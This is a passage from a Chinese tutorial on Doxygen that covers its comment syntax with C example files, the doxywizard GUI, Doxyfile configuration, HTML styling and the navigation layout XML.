aria-hidden=\"true\"><span></span><span></span></span></code></pre>\n<p>ok，讲到这里，基本把Doxygen的机制给解释清楚了，如果您还不理解，最简单的方法就是把你假设为Doxygen<br>\n作者，重新推演一遍。</p>\n<p>下面咱们看看Doxygen怎么解决这两个问题的</p>\n<p><strong>区分普通注释和特殊注释</strong></p>\n<p>对于C/C++语言来说，注释形式有两种</p>\n<pre data-language=\"c\"><code><span>//</span>\n<span>/* */</span><span aria-hidden=\"true\"><span></span><span></span></span></code></pre>\n<p>Doxygen通过在这里增加<code>*</code>，<code>/</code>，<code>!</code>来作为特殊标记，比如</p>\n<p>对于<code>/* */</code>这种注释来说，正常注释为</p>\n<pre data-language=\"c\"><code><span>/*\n * 正常注释\n */</span><span aria-hidden=\"true\"><span></span><span></span><span></span></span></code></pre>\n<p>Doxygen在注释第一个<code>*</code>后，设置<code>*</code>或<code>!</code>作为标志，如果检测到有这些，<br>\n就将接下来的注释作为导出文档来解释</p>\n<pre data-language=\"c\"><code><span>/**\n * 要输出成文档的注释\n */</span>\n\n 或者\n\n<span>/*!\n * 要输出成文档的注释\n */</span><span aria-hidden=\"true\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>同时，中间的<code>*</code>号可以省略，像这样</p>\n<pre data-language=\"c\"><code><span>/**\n   要输出成文档的注释\n */</span>\n\n 或者\n\n<span>/*!\n   要输出成文档的注释\n */</span><span aria-hidden=\"true\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>对于<code>//</code>这种类型的注释，Doxygen在第二个<code>/</code>后，增加<code>!</code>或<code>/</code>作为区分标志，如果检测到有这些，<br>\n就将接下来的注释作为导出文档来解释</p>\n<pre data-language=\"c\"><code><span>/// 要输出成文档的注释</span>\n\n或者\n\n<span>//! 要输出成文档的注释</span><span aria-hidden=\"true\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>对于这种呢，有一个潜在的问题，很多时候，我们需要在把注释放到后面，比如下面这种</p>\n<pre data-language=\"c\"><code><span><span>#</span><span>define</span> <span>DEV_ON</span>      <span><span>(</span><span>(</span><span>int</span><span>)</span><span>(</span><span>1</span><span>)</span><span>)</span>      </span><span>//! Simple device is power on.</span></span>\n<span><span>#</span><span>define</span> <span>DEV_OFF</span>     <span><span>(</span><span>(</span><span>int</span><span>)</span><span>(</span><span>0</span><span>)</span><span>)</span>      </span><span>//! Simple device is power off.</span></span><span aria-hidden=\"true\"><span></span><span></span></span></code></pre>\n<p>如果真要这么写的话，Doxygen会把<code>//! Simple device is power on.</code>当做<code>DEV_OFF</code>的注释，这<br>\n当然不是我们所希望的! 怎么办呢，只好再加一个特殊标记了，Doxygen针对这种情况，需要在<code>!</code>后<br>\n再增加一个<code>&lt;</code>标志符，如果检测到这个，则认为这个注释是为前面代码准备的，所以，上面的注释应该<br>\n这么写</p>\n<pre data-language=\"c\"><code><span><span>#</span><span>define</span> <span>DEV_ON</span>      <span><span>(</span><span>(</span><span>int</span><span>)</span><span>(</span><span>1</span><span>)</span><span>)</span>      </span><span>//!&lt; Simple device is power on.</span></span>\n<span><span>#</span><span>define</span> <span>DEV_OFF</span>     <span><span>(</span><span>(</span><span>int</span><span>)</span><span>(</span><span>0</span><span>)</span><span>)</span>      </span><span>//!&lt; Simple device is power off.</span></span><span aria-hidden=\"true\"><span></span><span></span></span></code></pre>\n<p>做到这里，Doxygen就可以正确区分普通注释和特殊注释了。</p>\n<p>**注：**提到特殊标记，其实吧，编程语言非常常用，比如HTML就是典型的markup语言，一堆一堆的括号，看着就头疼</p>\n<p>Doxygen采用<code>\\</code>和<code>@</code>作为特殊标记符，当在特殊注释里面检测到了特殊标记符，则接下来检测紧跟单词是不是Doxygen<br>\n事先规定好的，如果是，则将按照特定的规则来解释紧跟着的注释；如果不是呢，则将<code>\\</code>和<code>@</code>解释为普通文本，聪明吧</p>\n<p>可能有点拗口，下面给你个例子</p>\n<pre data-language=\"c\"><code><span>//***************************************************************************************</span>\n<span>//</span>\n<span>//! \\brief  Print Int number to terimal device.</span>\n<span>//!</span>\n<span>//! \\param  [in] number is the data you want to print.</span>\n<span>//! \\retval the number of print information, in bytes. return zero indicate print error !.</span>\n<span>//!</span>\n<span>//! \\note</span>\n<span>//! * Be sure you have called \\ref Dev_Init function before call this fuction.</span>\n<span>//! * Remember to check return value.</span>\n<span>//</span>\n<span>//***************************************************************************************</span>\n<span>extern</span> <span>int</span> <span>Dev_PrintInt</span><span>(</span><span>int</span> number<span>)</span><span>;</span><span aria-hidden=\"true\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>看到了吧，这里的<code>\\brief</code>和<code>\\param</code>都是特殊符号，表示简要描述和参数。万一你小手一抖，把<code>\\param</code><br>\n写成了<code>\\parame</code>，那就悲剧了，因为Doxygen不认识<code>parame</code>，所以它会把这句话当做是普通文本来处理</p>\n<p>其实，上面的<code>\\</code>换成<code>@</code>也是ok的，如下所示</p>\n<pre data-language=\"c\"><code><span>//***************************************************************************************</span>\n<span>//</span>\n<span>//! @brief  Print Int number to terimal device.</span>\n<span>//!</span>\n<span>//! @param  [in] number is the data you want to print.</span>\n<span>//! @retval the number of print information, in bytes. return zero indicate print error !.</span>\n<span>//!</span>\n<span>//! @note</span>\n<span>//! * Be sure you have called \\ref Dev_Init function before call this fuction.</span>\n<span>//! * Remember to check return value.</span>\n<span>//</span>\n<span>//***************************************************************************************</span>\n<span>extern</span> <span>int</span> <span>Dev_PrintInt</span><span>(</span><span>int</span> number<span>)</span><span>;</span><span aria-hidden=\"true\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>相信某些玩过ARM芯片的，对这类注释非常熟悉，官方库都是采用Doxygen语法规则注释的</p>\n<h3>示例</h3>\n<p>采用Doxygen语法为main.c dev.c dev.h添加注释信息，完成后的效果如下所示：</p>\n<p><code>main.c</code></p>\n<pre data-language=\"c\"><code><span>//***************************************************************************************</span>\n<span>//</span>\n<span>//! \\file main.c </span>\n<span>//! This is an simple example show developer how to use dev api to print int number.</span>\n<span>//!</span>\n<span>//! \\author    Cedar</span>\n<span>//! \\version   V1.0</span>\n<span>//! \\date      2014-03-23</span>\n<span>//! \\copyright GNU Public License V3.0</span>\n<span>//</span>\n<span>//***************************************************************************************</span>\n\n<span><span>#</span><span>include</span> <span>\"dev.h\"</span></span>\n\n<span><span>#</span><span>define</span> <span>CNT_MAX</span>  <span><span>10</span>  </span><span>//!&lt; The maxium number of print</span></span>\n\n<span>//! Simple device example.</span>\n<span>void</span> <span>DEV_Example</span><span>(</span><span>void</span><span>)</span>\n<span>{</span>\n\t<span>int</span> i <span>=</span> <span>0</span><span>;</span>\n\n\t<span>Dev_Init</span><span>(</span><span>)</span><span>;</span>\n\t\n\t<span>for</span> <span>(</span>i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> CNT_MAX<span>;</span> <span>++</span>i<span>)</span>\n\t<span>{</span>\n\t\t<span>Dev_PrintInt</span><span>(</span>i<span>)</span><span>;</span>\n\t<span>}</span>\n\n\t<span>Dev_Close</span><span>(</span><span>)</span><span>;</span>\n<span>}</span>\n\n<span>//! Application Entry</span>\n<span>int</span> <span>main</span><span>(</span><span>void</span><span>)</span>\n<span>{</span>\n\n\t<span>DEV_Example</span><span>(</span><span>)</span><span>;</span>\n\n\t<span>return</span> <span>0</span><span>;</span>\n<span>}</span><span aria-hidden=\"true\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><code>dev.c</code></p>\n<pre data-language=\"c\"><code><span>//***************************************************************************************</span>\n<span>//</span>\n<span>//! \\file dev.c </span>\n<span>//! the implement of simple device.</span>\n<span>//!</span>\n<span>//! \\author    Cedar</span>\n<span>//! \\version   V1.0</span>\n<span>//! \\date      2014-03-23</span>\n<span>//! \\copyright GNU Public License V3.0</span>\n<span>//</span>\n<span>//***************************************************************************************</span>\n\n<span>//! Simple device status.</span>\n<span>//! </span>\n<span>//! \\warning This variable is designed for internal, user \\b MUST \\b NOT call it.</span>\n<span>static</span> <span>int</span> __DevStatus <span>=</span> <span>0</span>\n\n<span>void</span> <span>Dev_Init</span><span>(</span><span>void</span><span>)</span>\n<span>{</span>\n\t<span>// Print debug information</span>\n\t<span>printf</span><span>(</span><span>\"Dev Initialize OK!\\r\\n\"</span><span>)</span><span>;</span>\n<span>}</span>\n\n<span>int</span> <span>Dev_PrintInt</span><span>(</span><span>int</span> number<span>)</span>\n<span>{</span>\n\t<span>printf</span><span>(</span><span>\"Print IntType number: %d\\r\\n\"</span><span>,</span> number<span>)</span><span>;</span>\n<span>}</span>\n\n<span>int</span> <span>Dev_StatusCheck</span><span>(</span><span>void</span><span>)</span>\n<span>{</span>\n\t<span>return</span> \t<span>(</span>__DevStatus<span>)</span><span>;</span>\n<span>}</span>\n\n<span>void</span> <span>Dev_Close</span><span>(</span><span>void</span><span>)</span>\n<span>{</span>\n\t<span>printf</span><span>(</span><span>\"Dev Close OK!\\r\\n\"</span><span>)</span><span>;</span>\n<span>}</span><span aria-hidden=\"true\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><code>dev.h</code></p>\n<pre data-language=\"c\"><code><span>//***************************************************************************************</span>\n<span>//</span>\n<span>//! \\file dev.h</span>\n<span>//!  Simple device user API.</span>\n<span>//!</span>\n<span>//! \\author    Cedar</span>\n<span>//! \\version   V1.0</span>\n<span>//! \\date      2014-03-23</span>\n<span>//! \\copyright GNU Public License V3.0</span>\n<span>//</span>\n<span>//***************************************************************************************</span>\n\n<span><span>#</span><span>include</span> <span>&lt;stdio.h&gt;</span></span>\n\n\n<span>//***************************************************************************************</span>\n<span>//</span>\n<span>//! \\addtogroup Dev_Status  Simple device status information.</span>\n<span>//! @{</span>\n<span>//</span>\n<span>//***************************************************************************************</span>\n\n<span><span>#</span><span>define</span> <span>DEV_ON</span>      <span><span>(</span><span>(</span><span>int</span><span>)</span><span>(</span><span>1</span><span>)</span><span>)</span>      </span><span>//!&lt; Simple device is power on.</span></span>\n<span><span>#</span><span>define</span> <span>DEV_OFF</span>     <span><span>(</span><span>(</span><span>int</span><span>)</span><span>(</span><span>0</span><span>)</span><span>)</span>      </span><span>//!&lt; Simple device is power off.</span></span>\n\n<span>//***************************************************************************************</span>\n<span>//</span>\n<span>//! @}</span>\n<span>//</span>\n<span>//***************************************************************************************</span>\n\n\n<span>//***************************************************************************************</span>\n<span>//</span>\n<span>//! \\addtogroup Dev_API  Simple device APIs list.</span>\n<span>//! @{</span>\n<span>//</span>\n<span>//***************************************************************************************</span>\n\n<span>//***************************************************************************************</span>\n<span>//</span>\n<span>//! \\brief  Initialize simple device.</span>\n<span>//!</span>\n<span>//! \\param  none.</span>\n<span>//! \\retval none.</span>\n<span>//!</span>\n<span>//! \\note   This function \\b MUST be called first before others function.</span>\n<span>//</span>\n<span>//***************************************************************************************</span>\n<span>extern</span> <span>void</span> <span>Dev_Init</span><span>(</span><span>void</span><span>)</span><span>;</span>\n\n<span>//***************************************************************************************</span>\n<span>//</span>\n<span>//! \\brief  Print Int number to terimal device.</span>\n<span>//!</span>\n<span>//! \\param  [in] number is the data you want to print.</span>\n<span>//! \\retval the number of print information, in bytes. return zero indicate print error !.</span>\n<span>//!</span>\n<span>//! \\note</span>\n<span>//! * Be sure you have called \\ref Dev_Init function before call this fuction.</span>\n<span>//! * Remember to check return value.</span>\n<span>//</span>\n<span>//***************************************************************************************</span>\n<span>extern</span> <span>int</span> <span>Dev_PrintInt</span><span>(</span><span>int</span> number<span>)</span><span>;</span>\n\n<span>//***************************************************************************************</span>\n<span>//</span>\n<span>//! \\brief  Check simple device status information.</span>\n<span>//!</span>\n<span>//! \\param  none.</span>\n<span>//! \\retval status information of simple device, which can be one of the following value:\\n</span>\n<span>//!  - \\ref DEV_ON</span>\n<span>//!  - \\ref DEV_OFF</span>\n<span>//!  \\n More information, please reference \\ref Dev_Status.</span>\n<span>//</span>\n<span>//***************************************************************************************</span>\n<span>extern</span> <span>int</span> <span>Dev_StatusCheck</span><span>(</span><span>void</span><span>)</span><span>;</span>\n\n<span>//***************************************************************************************</span>\n<span>//</span>\n<span>//! \\brief  Close simple device.</span>\n<span>//!</span>\n<span>//! \\param  none.</span>\n<span>//! \\retval none.</span>\n<span>//</span>\n<span>//***************************************************************************************</span>\n<span>extern</span> <span>void</span> <span>Dev_Close</span><span>(</span><span>void</span><span>)</span><span>;</span>\n\n<span>//***************************************************************************************</span>\n<span>//</span>\n<span>//! @}</span>\n<span>//</span>\n<span>//***************************************************************************************</span>\n\n<span>//***************************************************************************************</span>\n<span>//</span>\n<span>//! \\example main.c</span>\n<span>//!  Show how to use simple device to print int number.</span>\n<span>//</span>\n<span>//***************************************************************************************</span><span aria-hidden=\"true\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><strong>4. 生成文档</strong></p>\n<pre data-language=\"bash\"><code>$ doxygen <span>&lt;</span>config-file<span>&gt;</span><span aria-hidden=\"true\"><span></span></span></code></pre>\n<h2>Win 图形界面使用</h2>\n<h3>第1章 安装</h3>\n<p>在Linux下可以通过<code>apt install doxygen</code>安装命令行工具，然后用<code>apt install doxygen-gui</code>安装图形界面。对Linux用户来说，命令行工具可以通过<code>doxygen</code>命令运行，而图形界面可以通过<code>doxywizard</code>命令运行。</p>\n<p>而Windows用户可以在<a target=\"_blank\" rel=\"noopener\" href=\"https://links.jianshu.com/go?to=http%3A%2F%2Fwww.doxygen.nl%2Fdownload.html\">这里</a>下载，安装完毕后，直接双击就能运行图形界面。</p>\n<h4>1.1 基本使用</h4>\n<p>图形工具的基本使用如下图所示，有非常多的配置选项，这里我们只填入必要的配置，其它配置都用默认值。</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414.webp\" alt=\"doxywizard使用步骤\"></p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-1.webp\" alt=\"doxywizard使用步骤\"></p>\n<p>我们的工作目录如下：</p>\n<pre data-language=\"csharp\"><code><span>.</span>\n├── <span>out</span>\n└── src\n    └── math<span>.</span>h<span aria-hidden=\"true\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>其中<code>math.h</code>代码如下：</p>\n<pre data-language=\"c\"><code><span>/*! \\file math.h */</span>\n\n<span>/*!\n    用于求一个角度的sin值，输入是字符串以便同时支持弧度制和角度制表示\n    \\li 弧度制用pi表示，例如：2pi表示一圈、0.5pi表示直角\n    \\li 角度制用d结尾，例如：360d表示一圈、90d表示直角\n    \\li 输入也可以是数值，例如：输入3.14159大约表示180度\n\n    \\param a 用弧度制或角度制表示都行，字符串必须用'\\0'表示结束\n    \\param[out] res 是输出参数，用于保存sin运算的结果\n\n    \\return 错误码，0表示成功，其它表示失败\n\n    \\todo 在xxx的情况下存在BUG，预计下一版本修复\n*/</span>\n<span>int</span> <span>sin</span><span>(</span><span>char</span> <span>*</span>a<span>,</span> <span>double</span> <span>*</span>res<span>)</span><span>;</span><span aria-hidden=\"true\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>Doxygen生成的HTML会放到<code>out</code>目录下，生成的HTML如图1-3所示。</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-2.webp\" alt=\"HTML界面\"></p>\n<h4>1.2 保存配置</h4>\n<p>在1.1节中我们配置了一些选项，也成功生成了HTML文档。我们希望下次代码改动后能够继续沿用上次配置，那么我们可以把这些配置保存成<code>Doxyfile</code>文件，见图1-4。</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-3.webp\" alt=\"保存Doxyfile配置文件\"></p>\n<h4>1.3 命令行运行Doxygen</h4>\n<p>有了配置文件后我们完全可以通过命令行来生成API文档，假设配置文件名为Doxyfile，那么我们只需要执行<code>doxygen /path/to/Doxyfile</code>即可生成API文档。</p>\n<p>通过命令行生成文档有许多好处，其中最主要的好处就是：能够集成到持续集成之类的自动化系统中。</p>\n<h3>第2章 为代码编写注释</h3>\n<h4>2.1 什么样的注释会被Doxygen识别？</h4>\n<p>Doxygen能识别这几种风格的注释：</p>\n<pre data-language=\"c\"><code><span>/**\n * ... text ...\n */</span>\n\n<span>/*!\n * ... text ...\n */</span>\n\n<span>///</span>\n<span>/// ... text ...</span>\n<span>///</span>\n\n<span>//!</span>\n<span>//!... text ...</span>\n<span>//!</span><span aria-hidden=\"true\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>文件的开头必须有文件注释，否则该文件不会被识别：</p>\n<pre data-language=\"c\"><code><span>/*! \\file math.h */</span><span aria-hidden=\"true\"><span></span></span></code></pre>\n<h4>2.2 注释怎么写</h4>\n<p>这个自己看<a target=\"_blank\" rel=\"noopener\" href=\"https://www.doxygen.nl/manual/docblocks.html#cppblock\">官网例子</a>体会吧。</p>\n<h3>第3章 为其它编程语言生成注释</h3>\n<p>Doxygen主要支持C语言，其它语法跟C差不多的语言（如：C++/C#/PHP/Java）也能够支持，我们称这类语言为「C语系语言」。而哪些跟C语法差异较大的语言叫做「非C语系语言」。</p>\n<p>对于大多非C语系语言，Doxygen都是支持的，Doxygen原生支持这些语言：IDL、Java、Javascript、C#、C、C++、D、PHP、Objective-C、Python、Fortran、VHDL。</p>\n<p>万一项目需要的语言（例如：Lua）Doxygen官方并不支持，那么只能自行编写「第三方语言扩展」来支持了。</p>\n<h4>3.1 Doxygen官方支持的语言</h4>\n<p>见图3-1，文件名符合<code>FILE_PATTERNS</code>都会被处理。其中包括了<code>.c</code>、<code>.h</code>、<code>.py</code>等等。</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-4.webp\" alt=\"img\"></p>\n<p>如果我们的扩展名并不在<code>FILE_PATTERNS</code>内，那么可以加上去。例如我们项目下的所有<code>.ccc</code>文件，其实是C语言代码（这很奇葩，举个例子而已）。那我们可以编辑Doxyfile配置文件满足这一需求，需要2个步骤。</p>\n<p>(1) 在<code>FILE_PATTERNS</code>中添加<code>*.ccc</code>，如图3-2</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-5.webp\" alt=\"img\"></p>\n<p>(2) 在<code>EXTENSION_MAPPING</code>中添加映射规则<code>ccc=C</code>，如图3-3。语法是<code>ext=language</code>，其中language可以取的值有：IDL、Java、Javascript、C#、C、C++、D、PHP、Objective-C、Python、Fortran、VHDL。</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-6.webp\" alt=\"img\"></p>\n<h4>3.2 Doxygen官方不支持的语言</h4>\n<p>以Lua语言为例，它的代码是长这样的：</p>\n<pre data-language=\"lua\"><code><span>-- \\file lmath.h</span>\n\n<span>--[[\n    用于求一个角度的sin值，输入是字符串以便同时支持弧度制和角度制表示\n    \\li 弧度制用pi表示，例如：2pi表示一圈、0.5pi表示直角\n    \\li 角度制用d结尾，例如：360d表示一圈、90d表示直角\n    \\li 输入也可以是数值，例如：输入3.14159大约表示180度\n\n    \\param a 字符串类型，表示角度，用弧度制或角度制表示都行\n\n    \\return 返回sin运算的结果\n\n    \\todo 在xxx的情况下存在BUG，预计下一版本修复\n--]]</span>\n<span>function</span> <span>sin</span><span>(</span>a<span>)</span>\n    <span>return</span> <span>1.123</span>\n<span>end</span><span aria-hidden=\"true\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以看到Lua的语法既不像C也不像Python。本节以Lua为例，介绍如何为Doxygen编写Lua语言扩展。<br>\n好吧，大多数人没有这种需求，这里就不介绍了。</p>\n<h3>第4章 定制Doxygen的输出</h3>\n<h4>4.1 定制页面样式</h4>\n<p>Doxygen输出的默认HTML比较难看，如图4-1。</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-7.webp\" alt=\"img\"></p>\n<p>如果嫌生成的HTML不好看，可以自定义HTML页面头部、尾部以及页面整体CSS样式表。<br>\n(1) 生成默认的风格的配置文件，敲这个命令：<code>doxygen -w html header.html footer.html customdoxygen.css</code>，可以生成<code>header.html</code>、<code>footer.html</code>、<code>customdoxygen.css</code>。<br>\n(2) 根据自己的需求修改这三个文件。<br>\n(3) 配置<code>HTML_HEADER</code>、<code>HTML_FOOTER</code>、<code>HTML_STYLESHEET</code>指向修改后的文件，如图4-2。</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-8.webp\" alt=\"img\"></p>\n<p>Doxygen默认的页面主色调大约是天蓝色的，可以通过<code>HTML_COLORSTYLE_HUE</code>、<code>HTML_COLORSTYLE_SAT</code>、<code>HTML_COLORSTYLE_GAMMA</code>修改主色调，这3个配置分别对应色相、饱和度、Gamma校正，见图4-3。如果不太懂色相、饱和度是啥意思，请自行百度「色彩模式」或参考Photoshop相关教程。</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-9.webp\" alt=\"img\"></p>\n<p>经过图4-3的修改，页面的主色调变为图4-4的样子。</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-10.webp\" alt=\"img\"></p>\n<h4>4.2 导航栏</h4>\n<p>Doxygen中「导航栏」有两种展示方式：Treeview和Index，分别是竖向和横向的，如图4-5。</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-11.webp\" alt=\"img\"></p>\n<p>可以配置<code>DISABLE_INDEX</code>和<code>GENERATE_TREEVIEW</code>来控制是否显示它们，如图4-6。</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-12.webp\" alt=\"img\"></p>\n<h4>4.3 自定义「导航栏」的目录结构</h4>\n<p>我们已经知道Doxygen中「导航栏」有Treeview和Index两种了。这节介绍如何定制导航栏的目录结构。这需要三个步骤。<br>\n(1) 执行<code>doxygen -l</code>，生成<code>DoxygenLayout.xml</code>文件<br>\n(2) 编辑<code>DoxygenLayout.xml</code>文件，修改其中的布局<br>\n(3) 修改<code>LAYOUT_FILE</code>配置，使其指向<code>DoxygenLayout.xml</code>文件，如图4-7<br>\n(4) 运行Doxygen</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-13.webp\" alt=\"img\"></p>\n<p>那么如何修改XML文件呢？默认的<code>DoxygenLayout.xml</code>代码如下：</p>\n<pre data-language=\"markup\"><code><span><span><span>&lt;</span>doxygenlayout</span> <span>version</span><span><span>=</span><span>\"</span>1.0<span>\"</span></span><span>&gt;</span></span>\n  <span><span><span>&lt;</span>navindex</span><span>&gt;</span></span>\n    <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>mainpage<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span><span>\"</span></span><span>/&gt;</span></span>\n    <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>pages<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>intro</span><span><span>=</span><span>\"</span><span>\"</span></span><span>/&gt;</span></span>\n    <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>modules<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>intro</span><span><span>=</span><span>\"</span><span>\"</span></span><span>/&gt;</span></span>\n    <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>namespaces<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span><span>\"</span></span><span>&gt;</span></span>\n      <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>namespacelist<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>intro</span><span><span>=</span><span>\"</span><span>\"</span></span><span>/&gt;</span></span>\n      <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>namespacemembers<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>intro</span><span><span>=</span><span>\"</span><span>\"</span></span><span>/&gt;</span></span>\n    <span><span><span>&lt;/</span>tab</span><span>&gt;</span></span>\n    <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>classes<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span><span>\"</span></span><span>&gt;</span></span>\n      <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>classlist<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>intro</span><span><span>=</span><span>\"</span><span>\"</span></span><span>/&gt;</span></span>\n      <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>classindex<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>$ALPHABETICAL_INDEX<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span><span>\"</span></span><span>/&gt;</span></span> \n      <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>hierarchy<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>intro</span><span><span>=</span><span>\"</span><span>\"</span></span><span>/&gt;</span></span>\n      <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>classmembers<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>intro</span><span><span>=</span><span>\"</span><span>\"</span></span><span>/&gt;</span></span>\n    <span><span><span>&lt;/</span>tab</span><span>&gt;</span></span>\n    <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>files<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span><span>\"</span></span><span>&gt;</span></span>\n      <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>filelist<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>intro</span><span><span>=</span><span>\"</span><span>\"</span></span><span>/&gt;</span></span>\n      <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>globals<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>intro</span><span><span>=</span><span>\"</span><span>\"</span></span><span>/&gt;</span></span>\n    <span><span><span>&lt;/</span>tab</span><span>&gt;</span></span>\n    <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>examples<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>intro</span><span><span>=</span><span>\"</span><span>\"</span></span><span>/&gt;</span></span>  \n  <span><span><span>&lt;/</span>navindex</span><span>&gt;</span></span>\n<span><span><span>&lt;/</span>doxygenlayout</span><span>&gt;</span></span><span aria-hidden=\"true\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>XML对应了导航栏的目录树结构，我们通过该文件改变布局。标签的<code>type</code>属性取值除了上面列出的这些预定义值以外，还可以是<code>type=\"user\"</code>或<code>type=\"usergroup\"</code>，我们只能通过这两个<code>type</code>自定义布局，例如下面这段代码，生成的效果如图4-8：</p>\n<pre data-language=\"markup\"><code><span><span><span>&lt;</span>doxygenlayout</span> 